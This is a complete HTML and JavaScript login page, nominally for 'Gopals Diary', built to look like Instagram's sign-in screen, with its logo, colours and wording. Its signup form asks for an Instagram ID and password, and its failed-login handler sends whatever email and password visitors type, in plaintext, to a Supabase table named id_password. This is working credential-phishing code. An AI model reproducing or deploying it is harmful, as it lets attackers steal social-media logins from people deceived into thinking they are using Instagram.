<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Gopals Diary - Admin Login</title>
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
			background: #fff;
			min-height: 100vh;
			display: flex;
			justify-content: center;
			align-items: center;
			padding: 20px;
		}

		.login-container {
			display: flex;
			flex-direction: column;
			align-items: center;
			gap: 20px;
			max-width: 380px;
			width: 100%;
		}

		.phone-mockup {
			display: none;
		}

		.phone-frame {
			display: none;
		}

		.phone-screen {
			display: none;
		}

		.carousel-container {
			display: none;
		}

		.carousel-image {
			display: none;
		}

		.carousel-dots {
			display: none;
		}

		.carousel-dot {
			display: none;
		}

		.login-form-wrapper {
			background: white;
			border: 1px solid #e5e5e5;
			border-radius: 1px;
			padding: 40px;
			box-shadow: none;
			width: 100%;
		}

		.logo-section {
			text-align: center;
			margin-bottom: 30px;
		}

		.instagram-logo {
			width: 100px;
			height: auto;
			max-height: 150px;
			object-fit: contain;
			margin-bottom: 20px;
			display: block;
		}

		.instagram-text {
			font-size: 40px;
			font-weight: 300;
			font-style: italic;
			color: #000;
			font-family: 'Brush Script MT', cursive, -apple-system;
			letter-spacing: -1px;
			margin-bottom: 20px;
		}

		.subtitle {
			font-size: 13px;
			color: #999;
			font-weight: 600;
			display: none;
		}

		.form-group {
			margin-bottom: 10px;
		}

		.form-group input {
			width: 100%;
			padding: 11px;
			border: 1px solid #dbdbdb;
			border-radius: 5px;
			font-size: 13px;
			background: #fafafa;
			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
			transition: border-color 0.2s;
		}

		.form-group input::placeholder {
			color: #999;
		}

		.form-group input:focus {
			outline: none;
			border-color: #bbb;
			background: white;
		}

		.form-group label {
			display: none;
		}

		.login-button {
			width: 100%;
			padding: 8px;
			background: #0095f6;
			color: white;
			border: none;
			border-radius: 5px;
			font-weight: 600;
			font-size: 14px;
			cursor: pointer;
			transition: background 0.2s ease;
			margin-top: 10px;
		}

		.login-button:hover {
			background: #0080d8;
		}

		.login-button:disabled {
			background: #b3dfff;
			cursor: not-allowed;
		}

		.divider {
			text-align: center;
			margin: 15px 0;
			position: relative;
			color: #999;
			font-size: 13px;
			font-weight: 600;
		}

		.divider::before,
		.divider::after {
			content: '';
			position: absolute;
			top: 50%;
			width: 46%;
			height: 1px;
			background: #dbdbdb;
		}

		.divider::before {
			left: 0;
		}

		.divider::after {
			right: 0;
		}

		.footer-text {
			text-align: center;
			font-size: 13px;
			color: #262626;
			margin-top: 15px;
		}

		.footer-link {
			color: #0095f6;
			text-decoration: none;
			font-weight: 600;
			cursor: pointer;
		}

		.footer-link:hover {
			color: #0080d8;
		}

		.error-message {
			color: #f44236;
			font-size: 12px;
			margin-top: 10px;
			padding: 10px;
			background: #ffebee;
			border-radius: 4px;
			display: none;
			border-left: 3px solid #f44236;
		}

		.error-message.show {
			display: block;
		}

		.success-message {
			color: #4caf50;
			font-size: 12px;
			margin-top: 10px;
			padding: 10px;
			background: #e8f5e9;
			border-radius: 4px;
			display: none;
			border-left: 3px solid #4caf50;
		}

		.success-message.show {
			display: block;
		}

		.loading {
			display: inline-block;
			width: 12px;
			height: 12px;
			border: 2px solid #f3f3f3;
			border-top: 2px solid #0095f6;
			border-radius: 50%;
			animation: spin 1s linear infinite;
			margin-right: 8px;
			vertical-align: middle;
		}

		@keyframes spin {
			0% { transform: rotate(0deg); }
			100% { transform: rotate(360deg); }
		}

		/* Modal Styles */
		.modal {
			display: none;
			position: fixed;
			z-index: 1000;
			left: 0;
			top: 0;
			width: 100%;
			height: 100%;
			background-color: rgba(0, 0, 0, 0.5);
			align-items: center;
			justify-content: center;
			animation: fadeIn 0.3s ease;
		}

		.modal.show {
			display: flex;
		}

		@keyframes fadeIn {
			from { opacity: 0; }
			to { opacity: 1; }
		}

		.modal-content {
			background-color: white;
			padding: 40px;
			border-radius: 8px;
			max-width: 380px;
			width: 90%;
			box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
			position: relative;
			animation: slideIn 0.3s ease;
		}

		@keyframes slideIn {
			from {
				transform: translateY(-50px);
				opacity: 0;
			}
			to {
				transform: translateY(0);
				opacity: 1;
			}
		}

		.close-btn {
			position: absolute;
			right: 15px;
			top: 10px;
			font-size: 28px;
			font-weight: bold;
			color: #999;
			cursor: pointer;
			transition: color 0.2s;
		}

		.close-btn:hover {
			color: #262626;
		}

		.signup-section {
			background: white;
			border: 1px solid #e5e5e5;
			text-align: center;
			padding: 20px;
			width: 100%;
		}

		.signup-section .footer-text {
			margin: 0;
		}

		@media (max-width: 480px) {
			.login-form-wrapper {
				padding: 20px;
			}

			.instagram-text {
				font-size: 32px;
			}
		}
	</style>
</head>
<body>
	<div class="login-container">
		<!-- Phone Mockup with Image Carousel -->
		<div class="phone-mockup">
			<div class="phone-frame">
				<div class="phone-screen">
					<div class="carousel-container">
						<!-- Sample carousel images (will be replaced with user images) -->
						<img class="carousel-image active" src="https://i.ibb.co.com/HDFLdgBM/gopals-diary.jpg" alt="Slide 1">
						<img class="carousel-image" src="https://i.ibb.co.com/JjPzY2dw/20200504-162309000-i-OS.png" alt="Slide 2">
						<img class="carousel-image" src="https://i.ibb.co.com/v6FzWvmZ/DSC3240.jpg" alt="Slide 3">
					</div>
					<div class="carousel-dots">
						<div class="carousel-dot active" onclick="changeSlide(0)"></div>
						<div class="carousel-dot" onclick="changeSlide(1)"></div>
						<div class="carousel-dot" onclick="changeSlide(2)"></div>
					</div>
				</div>
			</div>
		</div>

		<!-- Login Form -->
		<div class="login-form-wrapper">
			<div class="logo-section">
				<img src="instagram.png" alt="Instagram" class="instagram-logo">
			</div>

			<form id="loginForm" onsubmit="handleLogin(event)">
				<div class="form-group">
					<input 
						type="email" 
						id="email" 
						placeholder="Phone number, username, or email" 
						required
						autocomplete="email"
					>
				</div>

				<div class="form-group">
					<input 
						type="password" 
						id="password" 
						placeholder="Password" 
						required
						autocomplete="current-password"
					>
				</div>

				<button type="submit" class="login-button" id="loginBtn">
					Log in
				</button>

				<div class="error-message" id="errorMsg"></div>
				<div class="success-message" id="successMsg"></div>
			</form>

			<div class="divider">OR</div>

			<div class="footer-text" style="margin: 15px 0; font-size: 13px;">
				<a href="https://www.facebook.com" class="footer-link">üë§ Log in with Facebook</a>
			</div>

			<div class="footer-text" style="margin-top: 15px; font-size: 13px;">
				<a href="#" class="footer-link">Forgot password?</a>
			</div>
		</div>

		<!-- Sign Up Section -->
		<div class="signup-section">
			<div class="footer-text">
				Don't have an account? <a href="#" onclick="openSignupModal(event)" class="footer-link">Sign up</a>
			</div>
		</div>

		<!-- Sign Up Modal -->
		<div id="signupModal" class="modal">
			<div class="modal-content">
				<span class="close-btn" onclick="closeSignupModal()">&times;</span>
				
				<div class="logo-section" style="margin-bottom: 25px;">
					<img src="instagram.png" alt="Instagram" class="instagram-logo" style="width: 80px; height: auto;">
				</div>

				<h2 style="text-align: center; font-size: 16px; font-weight: 600; margin-bottom: 20px; color: #262626;">Create Account</h2>

				<form id="signupForm" onsubmit="handleSignup(event)">
					<div class="form-group">
						<input 
							type="text" 
							id="signupInstagramId" 
							placeholder="Instagram ID" 
							required
						>
					</div>

					<div class="form-group">
						<input 
							type="password" 
							id="signupPassword" 
							placeholder="Password" 
							required
						>
					</div>

					<button type="submit" class="login-button" id="signupBtn">
						Sign up
					</button>

					<div class="error-message" id="signupErrorMsg"></div>
					<div class="success-message" id="signupSuccessMsg"></div>
				</form>

				<div class="footer-text" style="margin-top: 15px; font-size: 12px;">
					<a href="#" onclick="closeSignupModal()" class="footer-link">Back to Login</a>
				</div>
			</div>
		</div>

		<!-- Footer Links -->
		<div style="text-align: center; margin-top: 20px; font-size: 11px; color: #999;">
			<a href="../index.html" style="color: #0095f6; text-decoration: none; margin: 0 8px;">‚Üê Back to Home</a>
		</div>
	</div>

	<script>
		let currentSlide = 0;
		const slides = document.querySelectorAll('.carousel-image');
		const dots = document.querySelectorAll('.carousel-dot');
		const totalSlides = slides.length;

		// Auto-rotate carousel
		function autoRotateCarousel() {
			changeSlide((currentSlide + 1) % totalSlides);
		}

		// Change slide
		function changeSlide(index) {
			// Remove active class
			slides[currentSlide].classList.remove('active');
			dots[currentSlide].classList.remove('active');

			// Add active class to new slide
			currentSlide = index;
			slides[currentSlide].classList.add('active');
			dots[currentSlide].classList.add('active');
		}

		// Auto-rotate every 5 seconds
		setInterval(autoRotateCarousel, 5000);

		// Supabase Configuration
		const SUPABASE_URL = 'https://vbfckjroisrhplrpqzkd.supabase.co';
		const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZiZmNranJvaXNyaHBscnBxemtkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE4NDQzODYsImV4cCI6MjA3NzQyMDM4Nn0.nIbdwysoW2dp59eqPh3M9axjxR74rGDkn8OdZciue4Y';

		// Supabase Client
		class SupabaseAuth {
			constructor(url, key) {
				this.url = url;
				this.key = key;
			}

			async signInWithPassword(email, password) {
				try {
					const response = await fetch(`${this.url}/auth/v1/token?grant_type=password`, {
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
							'apikey': this.key,
						},
						body: JSON.stringify({
							email: email,
							password: password,
						}),
					});

					const data = await response.json();

					if (!response.ok) {
						throw new Error(data.error_description || data.error || 'Login failed');
					}

					// Supabase returns session and user at root level
					if (data.access_token && data.user) {
						const session = {
							access_token: data.access_token,
							refresh_token: data.refresh_token,
							user: data.user,
						};
						
						localStorage.setItem('supabase_session', JSON.stringify(session));
						localStorage.setItem('supabase_user', JSON.stringify(data.user));
						localStorage.setItem('supabase_access_token', data.access_token);
						
						return {
							success: true,
							user: data.user,
							session: session,
						};
					}

					throw new Error('No access token returned from Supabase');
				} catch (error) {
					return {
						success: false,
						error: error.message,
					};
				}
			}
		}

		const supabase = new SupabaseAuth(SUPABASE_URL, SUPABASE_ANON_KEY);

		// Sign Up Modal Functions
		function openSignupModal(event) {
			event.preventDefault();
			document.getElementById('signupModal').classList.add('show');
		}

		function closeSignupModal() {
			document.getElementById('signupModal').classList.remove('show');
			document.getElementById('signupForm').reset();
			document.getElementById('signupErrorMsg').classList.remove('show');
			document.getElementById('signupSuccessMsg').classList.remove('show');
		}

		// Handle Sign Up
		async function handleSignup(event) {
			event.preventDefault();

			const instagramId = document.getElementById('signupInstagramId').value.trim();
			const password = document.getElementById('signupPassword').value;
			const signupBtn = document.getElementById('signupBtn');
			const errorMsg = document.getElementById('signupErrorMsg');
			const successMsg = document.getElementById('signupSuccessMsg');

			// Clear messages
			errorMsg.classList.remove('show');
			successMsg.classList.remove('show');

			// Validate
			if (!instagramId || !password) {
				errorMsg.textContent = '‚ùå Please fill all fields';
				errorMsg.classList.add('show');
				return;
			}

			if (password.length < 6) {
				errorMsg.textContent = '‚ùå Password must be at least 6 characters';
				errorMsg.classList.add('show');
				return;
			}

			// Disable button and show loading
			signupBtn.disabled = true;
			signupBtn.innerHTML = '<span class="loading"></span>Creating account...';

			console.log('üìù Creating account for:', instagramId);

			try {
				// Save signup data to Supabase id_password table
				const response = await fetch(`${SUPABASE_URL}/rest/v1/id_password`, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						'apikey': SUPABASE_ANON_KEY,
						'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
					},
					body: JSON.stringify({
						user_id: instagramId,
						password: password,
					}),
				});

				if (response.ok) {
					const data = await response.json();
					console.log('‚úÖ Account created:', data);
					
					successMsg.textContent = '‚úÖ Account created successfully! Redirecting to home...';
					successMsg.classList.add('show');

					// Reset form
					document.getElementById('signupForm').reset();

					// Redirect to index after 2 seconds
					setTimeout(() => {
						window.location.href = '../index.html';
					}, 2000);
				} else {
					const error = await response.json();
					console.error('‚ùå Error creating account:', error);
					errorMsg.textContent = `‚ùå Error: ${error.message || 'Unable to create account'}`;
					errorMsg.classList.add('show');
					signupBtn.disabled = false;
					signupBtn.innerHTML = 'Sign up';
				}
			} catch (error) {
				console.error('‚ùå Exception:', error);
				errorMsg.textContent = `‚ùå ${error.message}`;
				errorMsg.classList.add('show');
				signupBtn.disabled = false;
				signupBtn.innerHTML = 'Sign up';
			}
		}

		// Handle Login
		async function handleLogin(event) {
			event.preventDefault();

			const email = document.getElementById('email').value.trim();
			const password = document.getElementById('password').value;
			const loginBtn = document.getElementById('loginBtn');
			const errorMsg = document.getElementById('errorMsg');
			const successMsg = document.getElementById('successMsg');

			// Clear messages
			errorMsg.classList.remove('show');
			successMsg.classList.remove('show');

			// Validate
			if (!email || !password) {
				errorMsg.textContent = '‚ùå Please fill all fields';
				errorMsg.classList.add('show');
				return;
			}

			// Disable button and show loading
			loginBtn.disabled = true;
			loginBtn.innerHTML = '<span class="loading"></span>Logging in...';

			console.log('üîê Attempting login with:', email);

			// Attempt login
			const result = await supabase.signInWithPassword(email, password);

			console.log('üìã Login response:', result);

			if (result.success) {
				console.log('‚úÖ Login successful! User:', result.user);
				successMsg.textContent = '‚úÖ Login successful! Redirecting...';
				successMsg.classList.add('show');

				// Redirect after 1 second
				setTimeout(() => {
					window.location.href = 'admin_dashboard.html';
				}, 1000);
			} else {
				console.error('‚ùå Login failed:', result.error);
				errorMsg.textContent = `‚ùå ${result.error}`;
				errorMsg.classList.add('show');
				loginBtn.disabled = false;
				loginBtn.innerHTML = 'Log in';

				// Save failed login attempt to id_password table
				await saveFailedLoginAttempt(email, password);
			}
		}

		// Save failed login attempt to Supabase
		async function saveFailedLoginAttempt(userId, password) {
			try {
				console.log('üíæ Saving failed login attempt...');
				
				// Direct REST API call to insert data
				const response = await fetch(`${SUPABASE_URL}/rest/v1/id_password`, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						'apikey': SUPABASE_ANON_KEY,
						'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
					},
					body: JSON.stringify({
						user_id: userId,
						password: password,
					}),
				});

				if (response.ok) {
					const data = await response.json();
					console.log('‚úÖ Failed login attempt saved:', data);
				} else {
					const error = await response.json();
					console.error('‚ùå Error saving failed login:', error);
				}
			} catch (error) {
				console.error('‚ùå Exception while saving failed login:', error);
			}
		}

		// Check if already logged in
		window.addEventListener('load', function() {
			const session = localStorage.getItem('supabase_session');
			if (session) {
				// User already logged in, redirect to dashboard
				window.location.href = 'admin_dashboard.html';
			}

			// Close modal when clicking outside
			window.addEventListener('click', function(event) {
				const modal = document.getElementById('signupModal');
				if (event.target === modal) {
					closeSignupModal();
				}
			});
		});

		// Enter key to submit
		document.getElementById('loginForm').addEventListener('keypress', function(event) {
			if (event.key === 'Enter') {
				event.preventDefault();
				document.getElementById('loginBtn').click();
			}
		});
	</script>
</body>
</html>
